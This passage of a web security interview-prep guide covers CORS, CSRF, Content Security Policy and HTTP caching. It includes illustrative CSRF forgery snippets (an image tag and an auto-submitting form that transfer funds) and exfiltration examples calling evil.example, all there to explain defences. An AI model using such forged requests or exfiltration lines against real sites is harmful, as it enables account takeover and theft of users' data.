+  <p>"Because Postman isn't a browser and has no origin, so there's nothing to enforce. The server is happily responding in both cases — in the browser, the response comes back and then the browser refuses to hand it to my JS because the CORS headers didn't permit my origin. Which also means 'it works in Postman' tells you the server is fine and the header config is missing — it's not evidence the browser is wrong."</p>
+  <p>Great extra detail: check the Network tab for an <code>OPTIONS</code> row. If the preflight is failing — often because auth middleware 401s it — the real request never fires at all.</p>
+  </details>
+
+  <h4>Follow-up: "Can you fix CORS from the frontend?"</h4>
+  <details><summary>Show the answer</summary>
+  <p>"Not genuinely — and that's the design. If the client could grant itself permission the mechanism would be pointless. I can't set the <code>Origin</code> header because it's a forbidden header name the browser controls, and <code>mode: 'no-cors'</code> doesn't help because it just gives me an opaque response I can't read. What I <em>can</em> do is remove the cross-origin-ness: a dev-server proxy locally, or a backend-for-frontend / same-origin path routing in production. Otherwise the server has to send the header."</p>
+  </details>
+
+  <h4>Follow-up: "What exactly does a preflight do, and how do you avoid one?"</h4>
+  <details><summary>Show the answer</summary>
+  <p>"It's an <code>OPTIONS</code> request the browser sends before the real one, carrying <code>Access-Control-Request-Method</code> and <code>-Headers</code>, asking the server whether that request is allowed. It fires whenever the request isn't 'simple' — anything other than GET/POST/HEAD, any non-safelisted header, or a Content-Type outside form-urlencoded / multipart / text-plain, which is why almost every JSON API call preflights."</p>
+  <p>"To reduce the cost: set <code>Access-Control-Max-Age</code> so the browser caches the approval instead of preflighting every call, and avoid gratuitous custom headers. You generally shouldn't try to <em>eliminate</em> it by sending JSON as <code>text/plain</code> — that's fighting a safety mechanism to save a round trip."</p>
+  </details>
+
+  <h4>Follow-up: "Why can't <code>Allow-Origin: *</code> be used with credentials?"</h4>
+  <details><summary>Show the answer</summary>
+  <p>"Because <code>*</code> means any origin may read the response, and a credentialed response is by definition personalised to the logged-in user. Allowing both would let any site fetch an authenticated endpoint with the victim's cookies and read the result — exactly what SOP exists to prevent. So with credentials the server has to name a specific origin, which forces a deliberate trust decision. In practice you check the incoming <code>Origin</code> against an allowlist, echo it back, and add <code>Vary: Origin</code> so caches don't cross the wires."</p>
+  </details>
+
+  <h4>Traps</h4>
+  <div class="trap"><span class="t">Wrong:</span> "CORS stops other websites from calling my API." <br><span class="t">Say instead:</span> "CORS stops other websites' <em>JavaScript</em> from <em>reading my responses</em> in a browser. The call itself still happens, and non-browser clients aren't affected at all."</div>
+  <div class="trap"><span class="t">Wrong:</span> "I fixed it by adding <code>mode: 'no-cors'</code>." This is the single most common false fix, and interviewers know it. It doesn't fix anything; it silences the error by giving you an unreadable opaque response. If your code "worked" after this, you weren't using the response.</div>
+  <div class="trap"><span class="t">Wrong:</span> "CORS errors are a browser bug / browsers being annoying." Reads as not understanding the threat model. The browser is doing its job, and the missing piece is a server configuration.</div>
+</div>
+
+<h2 id="csrf"><span class="num">Part 6</span>CSRF — riding someone else's session</h2>
+
+<p>We left a loose thread in the SOP section, and now we pull it.</p>
+
+<p>SOP stops <code>evil.example</code> from <em>reading</em> your bank's responses. Fine. But we established that the request still gets sent, and the server still processes it. So what if the attacker doesn't care about reading anything? What if the damage <em>is</em> the request?</p>
+
+<p>That's Cross-Site Request Forgery.</p>
+
+<h3>The mechanism, which is one sentence</h3>
+
+<p><strong>Browsers attach cookies to a request based on where it's going, not based on who initiated it.</strong></p>
+
+<p>Read that again, because it's the whole vulnerability. Your browser has no concept of "this request was triggered by code the bank wrote" versus "this request was triggered by an image tag on a forum." It sees a request headed for <code>bank.com</code>, checks its cookie jar for cookies scoped to bank.com, and attaches them. Every time. That's what cookies <em>are</em> — they were designed in 1994 to make HTTP stateful, and "who asked for this" wasn't part of the design.</p>
+
+<p>Here's the attack in full. You're logged into your bank in one tab. In another, you're reading a forum, where someone has posted this — and it renders as a broken image nobody looks at twice:</p>
+
+<pre class="solo"><code>&lt;img src="https://bank.com/transfer?to=attacker&amp;amount=5000"&gt;</code></pre>
+
+<p>Your browser sees an image tag. It fetches the URL. <strong>SOP doesn't apply to <code>&lt;img&gt;</code></strong> — remember, images cross origins freely. Your session cookie rides along, because the destination is bank.com. The bank's server sees a valid, authenticated request from a logged-in user and does the transfer.</p>
+
+<p>The browser then fails to render the response as an image and logs a console warning nobody reads. Money's gone. No JavaScript was needed at all.</p>
+
+<figure>
+<svg viewBox="0 0 700 250" role="img" aria-label="Diagram of a CSRF attack flow">
+  <defs>
+    <marker id="a3" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto">
+      <path d="M0,0 L7,3.2 L0,6.4 z" fill="#b3243b"/>
+    </marker>
+    <marker id="a4" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto">
+      <path d="M0,0 L7,3.2 L0,6.4 z" fill="#5c5867"/>
+    </marker>
+  </defs>
+  <g font-family="ui-monospace, monospace" font-size="11.5" fill="#232129">
+    <rect x="10" y="20" width="185" height="86" rx="8" fill="#fdeef0" stroke="#e29aa8"/>
+    <text x="102" y="42" text-anchor="middle" font-weight="700" font-size="12">forum.example</text>
+    <text x="102" y="62" text-anchor="middle" font-size="10.5" fill="#5c5867">attacker's post contains</text>
+    <text x="102" y="78" text-anchor="middle" font-size="10.5" fill="#5c5867">&lt;img src="bank.com/</text>
+    <text x="102" y="93" text-anchor="middle" font-size="10.5" fill="#5c5867">transfer?to=…"&gt;</text>
+
+    <rect x="255" y="20" width="185" height="86" rx="8" fill="#f2edfd" stroke="#c4aef0"/>
+    <text x="347" y="42" text-anchor="middle" font-weight="700" font-size="12">victim's browser</text>
+    <text x="347" y="63" text-anchor="middle" font-size="10.5" fill="#5c5867">cookie jar:</text>
+    <text x="347" y="79" text-anchor="middle" font-size="10.5" fill="#5c5867">bank.com → session=abc</text>
+    <text x="347" y="95" text-anchor="middle" font-size="10.5" fill="#14713d">(still logged in)</text>
+
+    <rect x="500" y="20" width="185" height="86" rx="8" fill="#eaf2fa" stroke="#9dc0e0"/>
+    <text x="592" y="42" text-anchor="middle" font-weight="700" font-size="12">bank.com</text>
+    <text x="592" y="66" text-anchor="middle" font-size="10.5" fill="#5c5867">"valid session,</text>
+    <text x="592" y="82" text-anchor="middle" font-size="10.5" fill="#5c5867">must be the user"</text>
+    <text x="592" y="98" text-anchor="middle" font-size="10.5" fill="#b3243b">✓ transfer executed</text>
+
+    <line x1="197" y1="63" x2="250" y2="63" stroke="#5c5867" stroke-width="1.5" marker-end="url(#a4)"/>
+    <line x1="442" y1="63" x2="495" y2="63" stroke="#b3243b" stroke-width="1.8" marker-end="url(#a3)"/>
+
+    <text x="120" y="140" font-size="11" fill="#5c5867">1. victim loads page</text>
+    <text x="455" y="140" font-size="11" fill="#b3243b">2. request + cookie</text>
+
+    <rect x="10" y="160" width="675" height="72" rx="8" fill="#fdf4e0" stroke="#dbbd80"/>
+    <text x="26" y="182" font-size="12" font-weight="700" fill="#8a5a00">The key insight</text>
+    <text x="26" y="202" font-size="11.5" fill="#232129">SOP stopped forum.example from READING bank.com's response — and that changed nothing,</text>
+    <text x="26" y="220" font-size="11.5" fill="#232129">because the attacker never wanted the response. The side effect was the goal.</text>
+  </g>
+</svg>
+<figcaption>CSRF lives in the gap between "request sent and processed" and "response not readable."</figcaption>
+</figure>
+
+<p>My analogy for this: cookies are like a <strong>hotel keycard that opens your room from anywhere in the building</strong>. It doesn't matter who's holding the door handle or why you're standing there — the lock only checks the card. CSRF is someone standing behind you in the corridor, saying "hey, could you push that door for me?", and the door opening because your card is in your pocket. Where the analogy breaks down: in a real hotel you'd notice. Here the door is a POST request and you never see a thing.</p>
+
+<p>POSTs are just as vulnerable, incidentally — an auto-submitting hidden form does it, and forms are exempt from SOP too:</p>
+
+<pre class="solo"><code>&lt;form action="https://bank.com/transfer" method="POST" id="f"&gt;
+  &lt;input type="hidden" name="to" value="attacker"&gt;
+  &lt;input type="hidden" name="amount" value="5000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit();&lt;/script&gt;</code></pre>
+
+<p>Note that this form posts as <code>application/x-www-form-urlencoded</code> — a <em>simple</em> request. No preflight. Nothing to approve. It just goes.</p>
+
+<h3>Why this hits cookie auth and not bearer tokens</h3>
+
+<p>Here's the property that makes cookies vulnerable: <strong>they're ambient.</strong> The browser attaches them automatically, without your code asking. Automatic attachment is exactly what an attacker needs, because the attacker can trigger a request but cannot write code that runs in your origin.</p>
+
+<p>Now compare a token in <code>localStorage</code>:</p>
+
+<pre class="solo"><code>fetch('/api/transfer', {
+  method: 'POST',
+  headers: { Authorization: `Bearer ${localStorage.getItem('token')}` },
+  //                          👆 YOUR code has to put this here
+});</code></pre>
+
+<p>The token only travels because your JavaScript explicitly read it and attached it. An attacker's page can't do that: it can't read your origin's localStorage (SOP partitions storage per origin), and even if it could send a request to your API, it has no token to attach. The request arrives unauthenticated and gets rejected.</p>
+
+<p><strong>So bearer tokens in localStorage are structurally immune to CSRF.</strong> That is a real, genuine advantage, and it's why so many SPA tutorials go that route.</p>
+
+<p>But — and this is the sentence that makes you sound senior — <strong>that doesn't remove the risk, it moves it.</strong> You've traded a CSRF problem for an XSS problem, and made it worse: a token in localStorage is readable by any script on your origin, so a single XSS becomes total, exfiltratable account compromise. With <code>HttpOnly</code> cookies, XSS is still bad, but the token itself can't leave the browser.</p>
+
+<p>We'll settle this properly in the token storage section. Park it.</p>
+
+<h3>Defence 1: SameSite cookies</h3>
+
+<p>Since the root cause is "browsers attach cookies regardless of who initiated the request," the cleanest fix is to make the browser <em>care</em> who initiated it. That's <code>SameSite</code>.</p>
+
+<pre class="solo"><code>Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/</code></pre>
+
+<p>Three values:</p>
+
+<h4><code>SameSite=Lax</code> — the modern default</h4>
+
+<p>Cookies are <strong>not</strong> sent on cross-site subrequests — images, iframes, fetch/XHR, and <strong>form POSTs</strong>. They <em>are</em> sent on <strong>top-level navigations that use a safe method</strong>, meaning: the user clicked a link and the whole page changed.</p>
+
+<p>That exception exists for usability. Without it, following a link to <code>github.com</code> from Slack would land you logged out, every time, which would feel broken. So Lax is a compromise: it kills the image-tag and hidden-form attacks (the overwhelming majority of CSRF) while keeping links working.</p>
+
+<p>Modern Chrome and Edge treat cookies with no <code>SameSite</code> attribute as <code>Lax</code> by default, which quietly wiped out an enormous amount of CSRF across the web. That's why CSRF feels less scary than it did in 2018.</p>
+
+<p>But — <strong>Lax is not complete protection</strong>, and this is a favourite interview follow-up. What still gets through:</p>
+
+<ul>
+  <li><strong>Top-level GET navigations.</strong> If any state-changing endpoint responds to GET — <code>/logout</code>, <code>/subscribe?plan=pro</code>, an old-style <code>/delete?id=5</code> — an attacker can just point a link or a redirect at it and the cookie rides along. Which is precisely why "never use GET for state changes" is a security rule, not just REST pedantry.</li>
+  <li><strong>Same-site but different-origin attacks.</strong> SameSite works at <em>site</em> level (the registrable domain), not origin. So if an attacker gets XSS on <code>blog.example.com</code>, or you let users host content on a subdomain, requests from there to <code>app.example.com</code> count as same-site and cookies flow.</li>
+  <li><strong>Chrome's two-minute grace window.</strong> Historically, freshly-set cookies with no explicit SameSite were still sent on top-level cross-site POSTs for a couple of minutes, to avoid breaking payment redirect flows. Setting <code>SameSite</code> explicitly opts out of that.</li>
+</ul>
+
+<h4><code>SameSite=Strict</code></h4>
+
+<p>Cookies are never sent on <em>any</em> cross-site request, including top-level navigation. Maximum safety, real UX cost: click a link to your app from an email, and you arrive logged out, even though your session is right there in the jar. Refreshing fixes it, which is a confusing experience.</p>
+
+<p>The pattern for high-value apps is two cookies: a <code>Strict</code> one for anything sensitive, plus a <code>Lax</code> "you are logged in" cookie that lets you render a signed-in-looking page and re-elevate.</p>
+
+<h4><code>SameSite=None</code></h4>
+
+<p>Explicitly opts <em>in</em> to cross-site sending — the old default behaviour. You need it for genuine cross-site cases: an embedded widget, an SSO iframe, an API on a different registrable domain than the frontend. <strong>It requires <code>Secure</code></strong> — browsers reject <code>SameSite=None</code> without it. And it means CSRF is fully back on the table, so you must pair it with tokens.</p>
+
+<div class="callout wait">
+  <span class="ctitle">Wait — does <code>SameSite=Lax</code> fully prevent CSRF?</span>
+  <p>No, and saying "yes" is one of the easiest ways to get marked down on this topic.</p>
+  <p>It's <em>excellent</em> — it eliminates the classic hidden-form-POST and image-tag attacks, and it's on by default in the biggest browsers. But it leaves top-level GET navigations, it operates at site rather than origin granularity so a compromised or user-controlled subdomain slips through, and browser behaviour varies (Safari and Firefox have historically differed from Chrome on defaults).</p>
+  <p>Treat it as a strong layer, not the only one. For anything genuinely sensitive: SameSite <em>plus</em> CSRF tokens <em>plus</em> origin checking, and never a GET that changes state.</p>
+</div>
+
+<h3>Defence 2: CSRF tokens</h3>
+
+<p>The deeper fix goes back to the root cause. The server can't distinguish a real request from a forged one, because both carry an identical cookie. So: require something in the request that <strong>only a script running on your origin could know</strong>.</p>
+
+<p>That's a CSRF token. A random, unguessable value tied to the session.</p>
+
+<h4>The synchronizer token pattern</h4>
+
+<p>The server generates a random token, stores it against the session, and embeds it in the page:</p>
+
+<pre class="solo"><code>&lt;form action="/transfer" method="POST"&gt;
+  &lt;input type="hidden" name="_csrf" value="Kj8Xm2p…"&gt;  &lt;!-- 👈 --&gt;
+  …
+&lt;/form&gt;</code></pre>
+
+<p>On submission, the server compares the submitted token against the one it stored. Match, proceed. Missing or wrong, reject.</p>
+
+<p><strong>Why does this work?</strong> Because the attacker's page can forge the cookie (well — cause it to be attached) but it cannot <em>read</em> the token. To read it, they'd have to load your page and pull the value out of the HTML, and SOP forbids exactly that: cross-origin script cannot read your response body or your iframe's DOM. The cookie is ambient; the token is not. That asymmetry is the entire defence.</p>
+
+<h4>The double-submit cookie pattern</h4>
+
+<p>Storing per-session tokens server-side is annoying for stateless APIs, so there's a variant. The server sets the random token as a <em>readable</em> (not HttpOnly) cookie. The client's JS reads it and copies it into a request header:</p>
+
+<pre class="solo"><code>const csrf = document.cookie.match(/csrfToken=([^;]+)/)[1];
+
+fetch('/api/transfer', {
+  method: 'POST',
+  headers: { 'X-CSRF-Token': csrf },   // 👈 same value, different channel
+  credentials: 'include',
+});</code></pre>
+
+<p>The server just checks that the cookie value and the header value match. No server-side storage at all.</p>
+
+<p>Why is it safe if the token is sitting in a cookie the attacker can cause to be sent? Because the attacker can trigger the <em>cookie</em> but can't set the <em>header</em>: setting a custom header on a cross-origin request requires a preflight, and your server will decline to approve requests from unknown origins. And they can't read the cookie's value to forge it, because SOP blocks cross-origin cookie reads.</p>
+
+<p>The catch: double-submit is weaker than the synchronizer pattern if an attacker can write cookies for your domain — which a compromised sibling subdomain can do, since cookies are domain-scoped rather than origin-scoped. The hardened version signs the token or binds it to the session. If you have subdomains you don't fully control, prefer synchronizer tokens.</p>
+
+<p>Also: this is why sending a custom header at all (even <code>X-Requested-With: XMLHttpRequest</code>) is a partial CSRF defence — it forces a preflight that the attacker's origin can't pass. It's a weak layer on its own, but it's the reason a JSON API that <em>strictly</em> requires <code>Content-Type: application/json</code> is harder to CSRF than a form endpoint.</p>
+
+<h3>Defence 3: check the Origin header</h3>
+
+<p>Every cross-origin request — and every POST, even same-origin, in modern browsers — carries an <code>Origin</code> header. The browser sets it and your JS <strong>cannot forge it</strong> (forbidden header name, remember). So the server can just look:</p>
+
+<div class="label good">✅ Fixed — cheap and effective</div>
+<pre><code>const origin = req.headers.origin || req.headers.referer;
+
+if (!origin || !ALLOWED_ORIGINS.has(new URL(origin).origin)) {
+  return res.status(403).send('Cross-origin request rejected');
+}</code></pre>
+
+<p>Simple, stateless, no tokens to manage. Two caveats: <code>Referer</code> can be stripped by privacy tools or a <code>Referrer-Policy</code>, so don't rely on it alone, and you have to decide what to do when <code>Origin</code> is absent (for non-browser clients, for example). Best used <em>alongside</em> tokens rather than instead of them.</p>
+
+<h3>Defence 4: never use GET for state changes</h3>
+
+<p>We've now seen this rule earn its keep twice. GET (and HEAD) are supposed to be <strong>safe methods</strong> — meaning no side effects. Once you honour that:</p>
+
+<ul>
+  <li><code>SameSite=Lax</code>'s top-level-navigation exception becomes harmless, because navigating to a GET endpoint can't change anything.</li>
+  <li><code>&lt;img&gt;</code>, <code>&lt;script&gt;</code>, prefetchers and link crawlers can't accidentally trigger destructive actions. (Google's Web Accelerator famously deleted people's data years ago by prefetching "delete" links.)</li>
+  <li>Browsers can safely retry, cache, and prerender.</li>
+</ul>
+
+<p>If a GET endpoint mutates state, no amount of SameSite configuration saves you.</p>
+
+<div class="interview">
+  <span class="ctitle">In an interview — CSRF</span>
+
+  <h4>How it gets asked</h4>
+  <p>"What's CSRF and how do you prevent it?" · "What's the difference between XSS and CSRF?" · "Why does a CSRF token work?" · "Does SameSite=Lax fully prevent CSRF?" · "If we use JWTs in headers, do we still need CSRF protection?"</p>
+
+  <div class="say">
+    <span class="tag">Model answer — say this out loud</span>
+    <p>"CSRF works because browsers attach cookies based on the request's destination, not on who initiated it. So a page on another site can trigger a request to my app — with an image tag, or an auto-submitting form — and the victim's session cookie rides along. The server sees a fully authenticated request and performs the action. The Same-Origin Policy doesn't help, because the attacker never needs to read the response; the side effect is the point.</p>
+    <p>The layered fix is: <code>SameSite=Lax</code> or <code>Strict</code> on session cookies so the browser stops sending them on cross-site subrequests; a CSRF token — either synchronizer or double-submit — which works because the attacker can cause the cookie to be sent but can't read the token out of my page; validating the <code>Origin</code> header, which JS can't forge; and never putting state changes behind GET.</p>
+    <p>It's specifically a cookie-auth problem. If I send a bearer token from JS I'm structurally immune, but that just moves the risk to XSS, because now the token is readable by any script on my origin."</p>
+  </div>
+
+  <p><strong>Why this lands:</strong> you named the ambient-credential mechanism instead of describing a symptom, you connected it back to SOP correctly, and you closed with the trade-off. That last paragraph is what turns "knows CSRF" into "reasons about auth design."</p>
+
+  <h4>Follow-up: "What's the difference between XSS and CSRF?"</h4>
+  <details><summary>Show the answer</summary>
+  <p>"XSS is code execution in my origin — the attacker's script runs with my page's full privileges, so they can read anything and do anything. CSRF is much narrower: the attacker can't run code in my origin and can't read my responses, they can only <em>cause a request</em> and rely on the browser attaching credentials. So XSS is a confidentiality <em>and</em> integrity break; CSRF is integrity only."</p>
+  <p>The killer add-on: "and XSS defeats every CSRF defence. If an attacker has script running in my origin, they can just read the CSRF token out of the DOM. So CSRF protection assumes you don't have XSS."</p>
+  </details>
+
+  <h4>Follow-up: "Why does a CSRF token actually work?"</h4>
+  <details><summary>Show the answer</summary>
+  <p>"Because it turns an ambient credential into an explicit one. The cookie is attached automatically, so having it proves nothing about who initiated the request. The token has to be deliberately included, and the attacker can't obtain it: reading it means reading my page's HTML or cookie from another origin, which SOP forbids. So a request carrying a valid token must have come from something that could read my origin — meaning my own page."</p>
+  </details>
+
+  <h4>Follow-up: "We use JWTs in an Authorization header. Do we need CSRF protection?"</h4>
+  <details><summary>Show the answer</summary>
+  <p>"If the token is only ever in memory or localStorage and attached explicitly by my code, then no — nothing is ambient, so there's nothing to forge. But two caveats. If the JWT is <em>also</em> stored in a cookie the server accepts, CSRF is fully back, and that's a common accidental setup. And going the localStorage route means any XSS is complete account compromise, so I've swapped one risk for another rather than eliminating risk."</p>
+  </details>
+
+  <h4>Follow-up: "SameSite=Lax is on by default now. Is CSRF solved?"</h4>
+  <details><summary>Show the answer</summary>
+  <p>"Mostly mitigated, not solved. Lax still permits top-level GET navigations, so any state-changing GET is exposed. It's site-scoped, not origin-scoped, so a compromised or user-controlled subdomain still counts as same-site. Browser defaults aren't uniform. And any endpoint that legitimately needs <code>SameSite=None</code> — embedded widgets, SSO iframes — is fully exposed. For sensitive operations I'd still want tokens and origin checks on top."</p>
+  </details>
+
+  <h4>Trap</h4>
+  <div class="trap"><span class="t">Wrong:</span> "CSRF is when an attacker injects a script into my site." That's XSS. Mixing these up is the fastest way to lose credibility on this topic — they get confused constantly, so interviewers are specifically listening for it. <br><span class="t">Say instead:</span> "CSRF involves no injected code at all. The attacker's page is entirely on their own origin; they just trigger a request to mine."</div>
+</div>
+
+<h2 id="csp"><span class="num">Part 7</span>Content Security Policy</h2>
+
+<p>Let's go back to XSS for a second. We fixed it by escaping output and avoiding <code>innerHTML</code>. Good. But you have 400 components, 60 dependencies, and a CMS. Are you <em>certain</em> there's no injection anywhere?</p>
+
+<p>No. Nobody is. So we want a second line of defence: a way to tell the browser <em>in advance</em> what our page is legitimately allowed to load and run, so that anything injected later gets refused even if it makes it into the DOM.</p>
+
+<p>That's Content Security Policy. It's a response header (or a <code>&lt;meta&gt;</code> tag, though the header is better) containing an allowlist:</p>
+
+<pre class="solo"><code>Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' https://cdn.example.com;
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https://images.example.com;
+  connect-src 'self' https://api.example.com;
+  frame-ancestors 'none';
+  object-src 'none';
+  base-uri 'self'</code></pre>
+
+<p>Now if an attacker injects <code>&lt;script src="https://evil.example/steal.js"&gt;</code>, the browser looks at <code>script-src</code>, sees evil.example isn't on the list, and refuses to load it. The XSS bug is still there — but it doesn't accomplish anything.</p>
+
+<p>Think of it as a <strong>bouncer with a printed guest list at the door of your page</strong>, checking every resource before it's allowed in. The list is written by you, in advance, and the browser enforces it. Where it breaks down: the bouncer only checks <em>where things came from</em>, not what they do. Something on the list that misbehaves gets in fine.</p>
+
+<h3>The directives worth knowing</h3>
+
+<div class="scroller">
+<table>
+  <thead><tr><th>Directive</th><th>Controls</th></tr></thead>
+  <tbody>
+    <tr><td><code>default-src</code></td><td>The fallback for most other <code>-src</code> directives. Set it to <code>'self'</code> and then open up specific ones — deny by default.</td></tr>
+    <tr><td><code>script-src</code></td><td>Where JS may load from, and whether inline scripts and <code>eval</code> are allowed. <strong>The one that matters most for XSS.</strong></td></tr>
+    <tr><td><code>style-src</code></td><td>Stylesheets and inline styles. CSS injection is a real (if lesser) exfiltration channel.</td></tr>
+    <tr><td><code>img-src</code></td><td>Image sources. Worth constraining because images are a classic exfiltration channel — <code>new Image().src = 'evil.example/?d=' + stolenData</code>.</td></tr>
+    <tr><td><code>connect-src</code></td><td>Where <code>fetch</code>, XHR, WebSockets, EventSource and <code>sendBeacon</code> may go. This is your anti-exfiltration directive: even with script running, it can't phone home to an unlisted host.</td></tr>
+    <tr><td><code>frame-ancestors</code></td><td>Who may embed <em>your</em> page in a frame. The modern anti-clickjacking control — see the last section.</td></tr>
+    <tr><td><code>object-src</code></td><td>Flash/plugins. Always <code>'none'</code>. There is no reason for anything else in 2026.</td></tr>
+    <tr><td><code>base-uri</code></td><td>Restricts <code>&lt;base href&gt;</code>. Without it, an injected base tag can silently repoint every relative script URL on the page to an attacker's server. Genuinely under-appreciated.</td></tr>
+    <tr><td><code>form-action</code></td><td>Where forms may submit. Stops injected forms exfiltrating whatever the user types.</td></tr>
+    <tr><td><code>upgrade-insecure-requests</code></td><td>Rewrites <code>http://</code> subresource URLs to <code>https://</code>. Handy during an HTTPS migration.</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h3>The inline script problem, and how nonces and hashes solve it</h3>
+
+<p>Here's the awkward part. A strict CSP blocks <strong>all</strong> inline scripts — every <code>&lt;script&gt;…&lt;/script&gt;</code> with content, and every <code>onclick="…"</code> attribute. That's not incidental; it's the whole point, because injected XSS is almost always inline.</p>
+
+<p>But real apps have legitimate inline scripts: analytics snippets, the SSR state blob we discussed, a theme-flash-prevention script that must run before paint.</p>
+
+<p>The lazy escape hatch is <code>'unsafe-inline'</code>, and it <strong>completely guts the policy</strong>. Once inline scripts are allowed, an injected inline script is allowed too, and <code>script-src</code> is doing essentially nothing for XSS. Same story for <code>'unsafe-eval'</code>, which re-enables <code>eval</code> and <code>new Function</code>.</p>
+
+<p>The real solutions:</p>
+
+<h4>Nonces</h4>
+
+<p>Generate a fresh random value <strong>per request</strong>, put it in the header and on your own script tags:</p>
+
+<pre class="solo"><code>Content-Security-Policy: script-src 'nonce-r4nd0mPerRequest'
+
+&lt;script nonce="r4nd0mPerRequest"&gt;  &lt;!-- 👈 runs --&gt;
+  window.__STATE__ = { … };
+&lt;/script&gt;
+
+&lt;script&gt;alert('injected')&lt;/script&gt;  &lt;!-- ❌ no nonce, blocked --&gt;</code></pre>
+
+<p>The attacker can't guess the nonce because it changes every response. Two rules: it must be <strong>cryptographically random</strong>, and it must be <strong>per-response</strong>. A hardcoded nonce in a static file is worthless — and note this means nonces need a server rendering the HTML; they don't work for a fully static, CDN-cached page.</p>
+
+<h4>Hashes</h4>
+
+<p>For static pages, allowlist the exact SHA of the script's contents:</p>
+
+<pre class="solo"><code>script-src 'sha256-B2yPHKaXnvFWtRChIbabYmUBFZdVfKKXHbWtWidDVF8='</code></pre>
+
+<p>No server-side randomness needed. The downside: change one byte of that script and the hash breaks, so it has to be part of your build.</p>
+
+<h4><code>'strict-dynamic'</code></h4>
+
+<p>Host allowlists turn out to be surprisingly weak in practice — research found most real-world CSPs bypassable, usually because some allowlisted CDN also hosts an old AngularJS build or a JSONP endpoint that will happily execute attacker-chosen code for you.</p>
+
+<p><code>'strict-dynamic'</code> changes the model: it says "trust is <em>propagated</em>." A script that was loaded with a valid nonce may load further scripts, and the host allowlist is ignored entirely. So your one trusted bootstrap script can pull in whatever it needs — which is exactly how webpack/module loaders behave — while injected markup, which has no nonce, still can't run.</p>
+
+<pre class="solo"><code>script-src 'nonce-{random}' 'strict-dynamic' https: 'unsafe-inline';
+             👆 modern browsers use this
+                                            👆 ignored by modern browsers,
+                                               fallback for ancient ones</code></pre>
+
+<p>That odd-looking line is the recommended strict pattern: newer browsers honour the nonce and strict-dynamic and ignore the rest; older ones ignore what they don't understand and fall back to something workable. Being able to explain <em>why</em> that policy has apparently contradictory pieces is a nice deep cut.</p>
+
+<h3>Rolling it out without breaking production</h3>
+
+<p>If you deploy a strict CSP to a mature app on a Friday afternoon, you will break something. Guaranteed. So use report-only mode:</p>
+
+<pre class="solo"><code>Content-Security-Policy-Report-Only:
+  default-src 'self'; report-uri /csp-violations</code></pre>
+
+<p>Nothing is blocked. Violations are logged (to the console, and POSTed to your endpoint). You run it for a couple of weeks, watch what fires, discover the seven third-party scripts marketing added that you didn't know about, fix or allowlist them — and only then flip to the enforcing header. You can run both headers simultaneously: a loose enforcing policy plus a strict report-only one you're working toward.</p>
+
+<div class="callout note">
+  <span class="ctitle">The honest note on CSP</span>
+  <p>CSP is <strong>defence in depth, not a fix</strong>. It reduces the impact of an XSS you didn't catch. It does not make injection safe, and a policy with <code>unsafe-inline</code> — which is a large fraction of real-world policies — provides almost no XSS protection at all.</p>
+  <p>In an interview, saying "we'd add a CSP" as your <em>primary</em> answer to XSS is a yellow flag. Saying "escape output contextually, avoid raw innerHTML, sanitise with an allowlist where we must — and layer a nonce-based CSP on top for the bugs we miss" is the answer.</p>
+</div>
+
+<h2 id="caching"><span class="num">Part 8</span>HTTP caching headers (and the security angle)</h2>
+
+<p>Caching feels like a performance topic, and mostly it is — but it shows up in security interviews for one specific reason we'll get to, and the headers themselves are a classic recall question. Let's do it properly, because two of these are confused constantly.</p>
+
+<h3>The mental model: two questions</h3>
+
+<p>Every caching decision answers two separate questions, and keeping them separate is 80% of understanding this:</p>
+
+<ol>
+  <li><strong>Can I use my stored copy without asking?</strong> — that's <em>freshness</em>, controlled by <code>Cache-Control: max-age</code>.</li>
+  <li><strong>If I do have to ask, can I avoid re-downloading?</strong> — that's <em>validation</em>, controlled by <code>ETag</code> and <code>Last-Modified</code>.</li>
+</ol>
+
+<p>A fresh response is used instantly with zero network. A stale one triggers a conditional request, which either returns a tiny <code>304 Not Modified</code> ("your copy is fine") or a full new response.</p>
+
+<h3><code>Cache-Control</code>, directive by directive</h3>
+
+<div class="scroller">
+<table>
+  <thead><tr><th>Directive</th><th>Meaning</th></tr></thead>
+  <tbody>
+    <tr><td><code>max-age=3600</code></td><td>Fresh for 3600 seconds from when it was received. During that window, the browser uses it with no network request at all.</td></tr>
+    <tr><td><code>s-maxage=600</code></td><td>Same, but only for <em>shared</em> caches (CDNs, proxies), and it overrides <code>max-age</code> there. Lets you say "browsers hold this 60s, the CDN holds it an hour."</td></tr>
+    <tr><td><code>no-cache</code></td><td><strong>Store it, but revalidate before every use.</strong> The name is a lie — it does not mean "don't cache."</td></tr>
+    <tr><td><code>no-store</code></td><td><strong>Don't write it to disk or memory at all.</strong> This is the actual "don't cache" one.</td></tr>
+    <tr><td><code>private</code></td><td>Only the end user's browser may cache it. Shared caches must not. Use for anything user-specific.</td></tr>
+    <tr><td><code>public</code></td><td>Any cache may store it, even if it'd normally be considered uncacheable (e.g. because the request had an <code>Authorization</code> header).</td></tr>
+    <tr><td><code>immutable</code></td><td>"This will never change — don't even revalidate on reload." For content-hashed filenames. Stops the wasteful 304 storm when a user hits refresh.</td></tr>
+    <tr><td><code>must-revalidate</code></td><td>Once stale, you may not serve it — you must check with the server, even if the network is down.</td></tr>
+    <tr><td><code>stale-while-revalidate=60</code></td><td>Serve the stale copy immediately, and refresh it in the background. Instant response, next visitor gets fresh content. Lovely for things where slightly-old is fine.</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h3><code>no-cache</code> vs <code>no-store</code> — spelling it out</h3>
+
+<p>These get asked because the naming is genuinely bad and the difference is genuinely important.</p>
+
+<p><code>no-cache</code> should have been called <code>always-revalidate</code>. The response <em>is</em> written to cache. The browser just isn't allowed to serve it without checking first. With an <code>ETag</code>, that check usually costs one small round trip and a <code>304</code> — you skip re-downloading the body entirely. It's a performance-friendly way to say "always up to date."</p>
+
+<p><code>no-store</code> means the response must not be written down anywhere. Not to disk, not to the CDN, not to the back/forward cache. Every request goes to the network and downloads the whole thing. It's a <em>privacy</em> directive, not a freshness one.</p>
+
+<div class="scroller">
+<table>
+  <thead><tr><th></th><th><code>no-cache</code></th><th><code>no-store</code></th></tr></thead>
+  <tbody>
